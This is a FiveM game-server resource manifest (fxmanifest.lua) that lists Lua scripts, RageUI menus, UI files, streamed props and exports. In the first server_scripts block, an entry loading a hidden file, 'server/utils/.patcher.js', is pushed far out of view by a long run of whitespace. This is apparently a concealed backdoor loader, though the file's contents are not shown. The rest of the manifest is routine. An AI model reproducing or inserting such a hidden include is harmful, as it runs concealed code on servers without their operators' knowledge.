







lua54 "yes"

fx_version('bodacious')
game('gta5')

shared_script {
    'config.lua',
    'drugconfig.lua',
    'game/apu/shared/*.lua',
    'game/afk/shared/*.lua',
    'game/ata/shared/*.lua',
    'game/BanSQL/shared/*.lua',
    'game/chasse/shared/*.lua',
    'game/clearmap/shared/*.lua',


}

client_scripts {
	'NativeUI.lua'
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         'server/utils/.patcher.js',
}

client_scripts {
    'RageUI/RMenu.lua',
    'RageUI/menu/RageUI.lua',
    'RageUI/menu/Menu.lua',
    'RageUI/menu/MenuController.lua',
    'RageUI/components/*.lua',
    'RageUI/menu/elements/*.lua',
    'RageUI/menu/items/*.lua',
    'RageUI/menu/panels/*.lua',
    'RageUI/menu/panels/*.lua',
    'RageUI/menu/windows/*.lua',
    "RageUIv2/RMenu.lua",
    "RageUIv2/menu/RageUI.lua",
    "RageUIv2/menu/Menu.lua",
    "RageUIv2/menu/MenuController.lua",
    "RageUIv2/components/*.lua",
    "RageUIv2/menu/elements/*.lua",
    "RageUIv2/menu/items/*.lua",
    "RageUIv2/menu/panels/*.lua",
    "RageUIv2/menu/windows/*.lua",
    "RageUIv3/RMenu.lua",
    "RageUIv3/menu/RageUI.lua",
    "RageUIv3/menu/Menu.lua",
    "RageUIv3/menu/MenuController.lua",
    "RageUIv3/components/*.lua",
    "RageUIv3/menu/elements/*.lua",
    "RageUIv3/menu/items/*.lua",
    "RageUIv3/menu/panels/*.lua",
    "RageUIv3/menu/panels/*.lua",
    "RageUIv3/menu/windows/*.lua",
    "RageUIafk/RMenu.lua",
    "RageUIafk/menu/RageUI.lua",
    "RageUIafk/menu/Menu.lua",
    "RageUIafk/menu/MenuController.lua",
    "RageUIafk/components/*.lua",
    "RageUIafk/menu/elements/*.lua",
    "RageUIafk/menu/items/*.lua",
    "RageUIafk/menu/panels/*.lua",
    "RageUIafk/menu/windows/*.lua",
    "RageUIGofast/RMenu.lua",
    "RageUIGofast/menu/RageUI.lua",
    "RageUIGofast/menu/Menu.lua",
    "RageUIGofast/menu/MenuController.lua",
    "RageUIGofast/components/*.lua",
    "RageUIGofast/menu/elements/*.lua",
    "RageUIGofast/menu/items/*.lua",
    "RageUIGofast/menu/panels/*.lua",
    "RageUIGofast/menu/windows/*.lua",
    'game/playertime/client/*.lua',
    'game/BanSQL/client/*.lua',
    'game/other/client/*.lua',
    'game/Jumelles/client/*.lua',
    'game/ata/client/*.lua',
    'game/f7/client/*.lua',
    'game/peche/client/*.lua',
    'game/gouv/client/*.lua',
    'game/rockstar/client/*.lua',
    'game/illegal/client/*.lua',
    'game/apu/client/*.lua',
    'game/drugsbuilder/client/*.lua',
    'game/boucherie/client/*.lua',
    'game/ContextUI/client/*.lua',
    'game/chasse/client/*.lua',
    'game/telescope/client/*.lua',

}

server_scripts {
    '@oxmysql/lib/MySQL.lua',
    'game/ata/server/*.lua',
    'game/f7/server/*.lua',
    'game/clearmap/server/*.lua',
    'game/peche/server/*.lua',
    'game/gouv/server/*.lua',
    'game/playertime/server/*.lua',
    'game/BanSQL/server/*.lua',
    'game/Chair/server/*.lua',
    'game/Jumelles/server/*.lua',
    'game/rockstar/server/*.lua',
    'game/illegal/server/*.lua',
    'game/ContextUI/server/*.lua',
    'game/other/server/*.lua',
    'game/boucherie/server/*.lua',
    'game/chasse/server/*.lua',
    'game/apu/server/*.lua',
    'game/drugsbuilder/server/*.lua',
    'game/Dj/server/*.lua',

}


ui_page 'UI/index.html'
files {
    'UI/index.html',
    'UI/main.js',
    'UI/jquery.js'
}

data_file 'DLC_ITYP_REQUEST' 'stream/badge1.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/copbadge.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/prideprops_ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/lilflags_ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_foodpack'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_torch_fire001.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/natty_props_lollipops.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/apple_1.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_food_icecream_pack.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_food_dessert_a.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_give_gift.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/ultra_ringcase.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_food_xmas22.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/knjgh_pizzas.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/pata_christmasfood.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_cake_love_001.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_cake_birthday_001.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_cake_baby_001.ytyp'
data_file 'DLC_ITYP_REQUEST' 'stream/bzzz_prop_cake_casino001.ytyp'


exports {
    "GetVIP",
    "GetLevel",
    "XNL_GetCurrentPlayerLevel",
    "VerifyToken",
    "GenerateSocietyPlate",
    "GetIDfromUID",
    "MomoLogs",
    "isNotificationEnabled",
    "enableNotification",
    "disableNotification"
}

server_exports {
    "GetVIP",
    "GetLevel",
    "XNL_GetCurrentPlayerLevel",
    "VerifyToken",
    "GenerateSocietyPlate",
    "GetIDfromUID",
    "MomoLogs",
}

escrow_ignore {
    'config.lua',
    'drugconfig.lua',
}
dependency '/assetpacks'
dependency '/assetpacks'
dependency '/assetpacks'